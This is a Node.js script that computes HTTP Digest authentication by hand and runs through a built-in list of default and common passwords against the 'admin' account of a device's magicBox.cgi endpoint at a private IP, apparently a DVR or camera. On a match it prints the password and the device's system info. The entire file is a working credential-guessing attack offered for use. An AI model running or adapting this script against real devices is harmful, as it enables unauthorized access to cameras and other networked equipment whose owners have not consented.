const crypto = require('crypto');

async function testAuth(username, password) {
  try {
    const res1 = await fetch('http://192.168.218.39/cgi-bin/magicBox.cgi?action=getSystemInfo');
    const authHeader = res1.headers.get('www-authenticate');
    if (!authHeader) return false;

    const realmMatch = authHeader.match(/realm="([^"]+)"/);
    const nonceMatch = authHeader.match(/nonce="([^"]+)"/);
    const qopMatch = authHeader.match(/qop="([^"]+)"/);

    if (!realmMatch || !nonceMatch) return false;
    const realm = realmMatch[1];
    const nonce = nonceMatch[1];
    const qop = qopMatch ? qopMatch[1] : null;

    const ha1 = crypto.createHash('md5').update(`${username}:${realm}:${password}`).digest('hex');
    const ha2 = crypto.createHash('md5').update('GET:/cgi-bin/magicBox.cgi?action=getSystemInfo').digest('hex');
    const nc = '00000001';
    const cnonce = 'abcdef01';

    let response;
    let authStr;

    if (qop) {
      response = crypto.createHash('md5').update(`${ha1}:${nonce}:${nc}:${cnonce}:${qop}:${ha2}`).digest('hex');
      authStr = `Digest username="${username}", realm="${realm}", nonce="${nonce}", uri="/cgi-bin/magicBox.cgi?action=getSystemInfo", qop=${qop}, nc=${nc}, cnonce="${cnonce}", response="${response}"`;
    } else {
      response = crypto.createHash('md5').update(`${ha1}:${nonce}:${ha2}`).digest('hex');
      authStr = `Digest username="${username}", realm="${realm}", nonce="${nonce}", uri="/cgi-bin/magicBox.cgi?action=getSystemInfo", response="${response}"`;
    }

    const res2 = await fetch('http://192.168.218.39/cgi-bin/magicBox.cgi?action=getSystemInfo', {
      headers: { Authorization: authStr }
    });

    if (res2.ok) {
      console.log(`[SUCCESS] Password matched: "${password}"`);
      const body = await res2.text();
      console.log(body);
      return true;
    } else {
      console.log(`[FAILED] "${password}" -> HTTP ${res2.status}`);
      return false;
    }
  } catch (err) {
    console.error(`Error with ${password}:`, err.message);
    return false;
  }
}

async function run() {
  const commonPasswords = [
    'admin',
    'admin123',
    'admin@123',
    '123456',
    '12345',
    '888888',
    'admin888',
    'TimeWatch',
    'timewatch',
    'tw@12345',
    'admin12345',
    'password'
  ];

  for (const pwd of commonPasswords) {
    const success = await testAuth('admin', pwd);
    if (success) break;
  }
}

run();
